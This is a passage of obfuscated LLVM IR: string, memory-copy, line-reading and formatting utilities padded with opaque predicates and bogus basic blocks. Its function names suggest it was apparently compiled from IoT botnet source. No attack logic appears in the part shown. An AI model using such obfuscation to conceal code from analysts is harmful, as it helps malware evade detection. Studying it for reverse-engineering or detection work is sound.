  %gen11 = mul i64 %_10, 4
  %_12 = sub i64 %133, 4
  %gen13 = mul i64 %_12, 4
  %134 = sub i64 %133, 4
  %135 = trunc i64 %134 to i32
  store i32 %135, i32* %4, align 4
  br label %originalBB

originalBB14alteredBB:                            ; preds = %originalBB14, %40
  %136 = call i32 @rand_next()
  %_15 = sub i32 0, %136
  %gen16 = add i32 %_15, 65535
  %_17 = shl i32 %136, 65535
  %137 = and i32 %136, 65535
  %138 = trunc i32 %137 to i16
  %139 = load i8*, i8** %3, align 8
  %140 = bitcast i8* %139 to i16*
  store i16 %138, i16* %140, align 2
  %141 = load i8*, i8** %3, align 8
  %142 = getelementptr inbounds i8, i8* %141, i64 2
  store i8* %142, i8** %3, align 8
  %143 = load i32, i32* %4, align 4
  %144 = sext i32 %143 to i64
  %_18 = sub i64 0, %144
  %gen19 = add i64 %_18, 2
  %_20 = shl i64 %144, 2
  %_21 = shl i64 %144, 2
  %_22 = sub i64 0, %144
  %gen23 = add i64 %_22, 2
  %_24 = shl i64 %144, 2
  %_25 = shl i64 %144, 2
  %145 = sub i64 %144, 2
  %146 = trunc i64 %145 to i32
  store i32 %146, i32* %4, align 4
  br label %originalBB14

originalBB29alteredBB:                            ; preds = %originalBB29, %68
  %147 = call i32 @rand_next()
  %148 = and i32 %147, 255
  %149 = trunc i32 %148 to i8
  %150 = load i8*, i8** %3, align 8
  %151 = getelementptr inbounds i8, i8* %150, i32 1
  store i8* %151, i8** %3, align 8
  store i8 %149, i8* %150, align 1
  %152 = load i32, i32* %4, align 4
  %_30 = sub i32 %152, -1
  %gen31 = mul i32 %_30, -1
  %_32 = sub i32 %152, -1
  %gen33 = mul i32 %_32, -1
  %_34 = shl i32 %152, -1
  %_35 = sub i32 %152, -1
  %gen36 = mul i32 %_35, -1
  %_37 = sub i32 %152, -1
  %gen38 = mul i32 %_37, -1
  %_39 = sub i32 %152, -1
  %gen40 = mul i32 %_39, -1
  %_41 = sub i32 0, %152
  %gen42 = add i32 %_41, -1
  %_43 = sub i32 0, %152
  %gen44 = add i32 %_43, -1
  %153 = add nsw i32 %152, -1
  store i32 %153, i32* %4, align 4
  br label %originalBB29

originalBB48alteredBB:                            ; preds = %originalBB48, %92
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %110
  br label %originalBB52
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %70, %2
  %9 = load i32, i32* %4, align 4
  %10 = icmp sgt i32 %9, 0
  br i1 %10, label %11, label %71

; <label>:11:                                     ; preds = %8
  %12 = load i32, i32* @x.15
  %13 = load i32, i32* @y.16
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %4, align 4
  %21 = sext i32 %20 to i64
  %22 = icmp uge i64 %21, 4
  %23 = load i32, i32* @x.15
  %24 = load i32, i32* @y.16
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %61

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = call i32 @rand_next()
  store i32 %32, i32* %6, align 4
  store i32 0, i32* %5, align 4
  br label %33

; <label>:33:                                     ; preds = %53, %31
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = icmp ult i64 %35, 4
  br i1 %36, label %37, label %56

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* %6, align 4
  %39 = and i32 %38, 255
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %7, align 1
  %41 = load i32, i32* %6, align 4
  %42 = lshr i32 %41, 8
  store i32 %42, i32* %6, align 4
  %43 = load i8, i8* %7, align 1
  %44 = zext i8 %43 to i32
  %45 = ashr i32 %44, 3
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %7, align 1
  %47 = load i8, i8* %7, align 1
  %48 = zext i8 %47 to i64
  %49 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %48
  %50 = load i8, i8* %49, align 1
  %51 = load i8*, i8** %3, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %3, align 8
  store i8 %50, i8* %51, align 1
  br label %53

; <label>:53:                                     ; preds = %37
  %54 = load i32, i32* %5, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %5, align 4
  br label %33

; <label>:56:                                     ; preds = %33
  %57 = load i32, i32* %4, align 4
  %58 = sext i32 %57 to i64
  %59 = sub i64 %58, 4
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %4, align 4
  br label %70

; <label>:61:                                     ; preds = %originalBBpart2
  %62 = call i32 @rand_next()
  %63 = zext i32 %62 to i64
  %64 = urem i64 %63, 32
  %65 = trunc i64 %64 to i8
  %66 = load i8*, i8** %3, align 8
  %67 = getelementptr inbounds i8, i8* %66, i32 1
  store i8* %67, i8** %3, align 8
  store i8 %65, i8* %66, align 1
  %68 = load i32, i32* %4, align 4
  %69 = add nsw i32 %68, -1
  store i32 %69, i32* %4, align 4
  br label %70

; <label>:70:                                     ; preds = %61, %56
  br label %8

; <label>:71:                                     ; preds = %8
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %11
  %72 = load i32, i32* %4, align 4
  %73 = sext i32 %72 to i64
  %74 = icmp uge i64 %73, 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

; <label>:4:                                      ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %13

; <label>:10:                                     ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %3, align 4
  br label %4

; <label>:13:                                     ; preds = %4
  %14 = load i32, i32* %3, align 4
  ret i32 %14
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

; <label>:11:                                     ; preds = %31, %3
  %12 = load i32, i32* @x.19
  %13 = load i32, i32* @y.20
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %6, align 4
  %21 = add nsw i32 %20, -1
  store i32 %21, i32* %6, align 4
  %22 = icmp ne i32 %20, 0
  %23 = load i32, i32* @x.19
  %24 = load i32, i32* @y.20
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %37

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i8*, i8** %8, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %8, align 8
  %34 = load i8, i8* %32, align 1
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %7, align 8
  store i8 %34, i8* %35, align 1
  br label %11

; <label>:37:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %11
  %38 = load i32, i32* %6, align 4
  %_ = sub i32 0, %38
  %gen = add i32 %_, -1
  %_1 = shl i32 %38, -1
  %_2 = sub i32 %38, -1
  %gen3 = mul i32 %_2, -1
  %_4 = sub i32 %38, -1
  %gen5 = mul i32 %_4, -1
  %_6 = sub i32 0, %38
  %gen7 = add i32 %_6, -1
  %39 = add nsw i32 %38, -1
  store i32 %39, i32* %6, align 4
  %40 = icmp ne i32 %38, 0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.23
  %5 = load i32, i32* @y.24
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  store i32 1, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %17 = load i32, i32* @x.23
  %18 = load i32, i32* @y.24
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %75, %originalBBpart2
  %26 = load i32, i32* @x.23
  %27 = load i32, i32* @y.24
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i32, i32* %15, align 4
  %35 = icmp eq i32 %34, 1
  %36 = load i32, i32* @x.23
  %37 = load i32, i32* @y.24
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %35, label %44, label %73

; <label>:44:                                     ; preds = %originalBBpart24
  %45 = load i32, i32* @x.23
  %46 = load i32, i32* @y.24
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %44
  %53 = load i32, i32* %16, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp slt i32 %53, %54
  %56 = load i32, i32* @x.23
  %57 = load i32, i32* @y.24
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %55, label %64, label %73

; <label>:64:                                     ; preds = %originalBBpart28
  %65 = load i8*, i8** %12, align 8
  %66 = load i32, i32* %16, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = getelementptr inbounds i8, i8* %68, i64 -1
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp ne i32 %71, 10
  br label %73

; <label>:73:                                     ; preds = %64, %originalBBpart28, %originalBBpart24
  %74 = phi i1 [ false, %originalBBpart28 ], [ false, %originalBBpart24 ], [ %72, %64 ]
  br i1 %74, label %75, label %85

; <label>:75:                                     ; preds = %73
  %76 = load i32, i32* %14, align 4
  %77 = load i8*, i8** %12, align 8
  %78 = load i32, i32* %16, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  %81 = call i64 @read(i32 %76, i8* %80, i64 1)
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %15, align 4
  %83 = load i32, i32* %16, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %16, align 4
  br label %25

; <label>:85:                                     ; preds = %73
  %86 = load i32, i32* %15, align 4
  %87 = icmp eq i32 %86, 0
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %85
  br label %107

; <label>:89:                                     ; preds = %85
  %90 = load i32, i32* @x.23
  %91 = load i32, i32* @y.24
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %89
  %98 = load i8*, i8** %12, align 8
  %99 = load i32, i32* @x.23
  %100 = load i32, i32* @y.24
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %107

; <label>:107:                                    ; preds = %originalBBpart212, %88
  %108 = phi i8* [ null, %88 ], [ %98, %originalBBpart212 ]
  ret i8* %108

originalBBalteredBB:                              ; preds = %originalBB, %3
  %109 = alloca i8*, align 8
  %110 = alloca i32, align 4
  %111 = alloca i32, align 4
  %112 = alloca i32, align 4
  %113 = alloca i32, align 4
  store i8* %0, i8** %109, align 8
  store i32 %1, i32* %110, align 4
  store i32 %2, i32* %111, align 4
  store i32 1, i32* %112, align 4
  store i32 0, i32* %113, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %114 = load i32, i32* %15, align 4
  %115 = icmp eq i32 %114, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %44
  %116 = load i32, i32* %16, align 4
  %117 = load i32, i32* %13, align 4
  %118 = icmp slt i32 %116, %117
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %89
  %119 = load i8*, i8** %12, align 8
  br label %originalBB10
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = load i32, i32* @x.25
  %4 = load i32, i32* @y.26
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %11, align 8
  store i8* %1, i8** %12, align 8
  %14 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %15 = bitcast %struct.__va_list_tag* %14 to i8*
  call void @llvm.va_start(i8* %15)
  %16 = load i8*, i8** %12, align 8
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %18 = call i32 @print(i8** %11, i8* %16, %struct.__va_list_tag* %17)
  %19 = load i32, i32* @x.25
  %20 = load i32, i32* @y.26
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %18

originalBBalteredBB:                              ; preds = %originalBB, %2
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %27, align 8
  store i8* %1, i8** %28, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %31 = bitcast %struct.__va_list_tag* %30 to i8*
  call void @llvm.va_start(i8* %31)
  %32 = load i8*, i8** %28, align 8
  %33 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %34 = call i32 @print(i8** %27, i8* %32, %struct.__va_list_tag* %33)
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %618, %3
  %13 = load i32, i32* @x.27
  %14 = load i32, i32* @y.28
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i8*, i8** %5, align 8
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  %25 = load i32, i32* @x.27
  %26 = load i32, i32* @y.28
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %621

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  br i1 %37, label %38, label %593

; <label>:38:                                     ; preds = %33
  %39 = load i32, i32* @x.27
  %40 = load i32, i32* @y.28
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %49 = load i8*, i8** %5, align 8
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 0
  %53 = load i32, i32* @x.27
  %54 = load i32, i32* @y.28
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %52, label %61, label %78

; <label>:61:                                     ; preds = %originalBBpart24
  %62 = load i32, i32* @x.27
  %63 = load i32, i32* @y.28
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %61
  %70 = load i32, i32* @x.27
  %71 = load i32, i32* @y.28
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %621

; <label>:78:                                     ; preds = %originalBBpart24
  %79 = load i8*, i8** %5, align 8
  %80 = load i8, i8* %79, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 37
  br i1 %82, label %83, label %84

; <label>:83:                                     ; preds = %78
  br label %610

; <label>:84:                                     ; preds = %78
  %85 = load i32, i32* @x.27
  %86 = load i32, i32* @y.28
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %84
  %93 = load i8*, i8** %5, align 8
  %94 = load i8, i8* %93, align 1
  %95 = zext i8 %94 to i32
  %96 = icmp eq i32 %95, 45
  %97 = load i32, i32* @x.27
  %98 = load i32, i32* @y.28
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %96, label %105, label %108

; <label>:105:                                    ; preds = %originalBBpart212
  %106 = load i8*, i8** %5, align 8
  %107 = getelementptr inbounds i8, i8* %106, i32 1
  store i8* %107, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %108

; <label>:108:                                    ; preds = %105, %originalBBpart212
  br label %109

; <label>:109:                                    ; preds = %130, %108
  %110 = load i32, i32* @x.27
  %111 = load i32, i32* @y.28
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %109
  %118 = load i8*, i8** %5, align 8
  %119 = load i8, i8* %118, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 48
  %122 = load i32, i32* @x.27
  %123 = load i32, i32* @y.28
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %121, label %130, label %135

; <label>:130:                                    ; preds = %originalBBpart216
  %131 = load i8*, i8** %5, align 8
  %132 = getelementptr inbounds i8, i8* %131, i32 1
  store i8* %132, i8** %5, align 8
  %133 = load i32, i32* %8, align 4
  %134 = or i32 %133, 2
  store i32 %134, i32* %8, align 4
  br label %109

; <label>:135:                                    ; preds = %originalBBpart216
  br label %136

; <label>:136:                                    ; preds = %189, %135
  %137 = load i8*, i8** %5, align 8
  %138 = load i8, i8* %137, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp sge i32 %139, 48
  br i1 %140, label %141, label %162

; <label>:141:                                    ; preds = %136
  %142 = load i32, i32* @x.27
  %143 = load i32, i32* @y.28
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %141
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp sle i32 %152, 57
  %154 = load i32, i32* @x.27
  %155 = load i32, i32* @y.28
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %162

; <label>:162:                                    ; preds = %originalBBpart220, %136
  %163 = phi i1 [ false, %136 ], [ %153, %originalBBpart220 ]
  br i1 %163, label %164, label %192

; <label>:164:                                    ; preds = %162
  %165 = load i32, i32* @x.27
  %166 = load i32, i32* @y.28
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %164
  %173 = load i32, i32* %7, align 4
  %174 = mul nsw i32 %173, 10
  store i32 %174, i32* %7, align 4
  %175 = load i8*, i8** %5, align 8
  %176 = load i8, i8* %175, align 1
  %177 = zext i8 %176 to i32
  %178 = sub nsw i32 %177, 48
  %179 = load i32, i32* %7, align 4
  %180 = add nsw i32 %179, %178
  store i32 %180, i32* %7, align 4
  %181 = load i32, i32* @x.27
  %182 = load i32, i32* @y.28
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBBpart238, label %originalBB22alteredBB

originalBBpart238:                                ; preds = %originalBB22
  br label %189

; <label>:189:                                    ; preds = %originalBBpart238
  %190 = load i8*, i8** %5, align 8
  %191 = getelementptr inbounds i8, i8* %190, i32 1
  store i8* %191, i8** %5, align 8
  br label %136

; <label>:192:                                    ; preds = %162
  %193 = load i8*, i8** %5, align 8
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 115
  br i1 %196, label %197, label %294

; <label>:197:                                    ; preds = %192
  %198 = load i32, i32* @x.27
  %199 = load i32, i32* @y.28
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %197
  %206 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %207 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %206, i32 0, i32 0
  %208 = load i32, i32* %207, align 8
  %209 = icmp ule i32 %208, 40
  %210 = load i32, i32* @x.27
  %211 = load i32, i32* @y.28
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %209, label %218, label %240

; <label>:218:                                    ; preds = %originalBBpart242
  %219 = load i32, i32* @x.27
  %220 = load i32, i32* @y.28
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %218
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %206, i32 0, i32 3
  %228 = load i8*, i8** %227, align 8
  %229 = getelementptr i8, i8* %228, i32 %208
  %230 = bitcast i8* %229 to i64*
  %231 = add i32 %208, 8
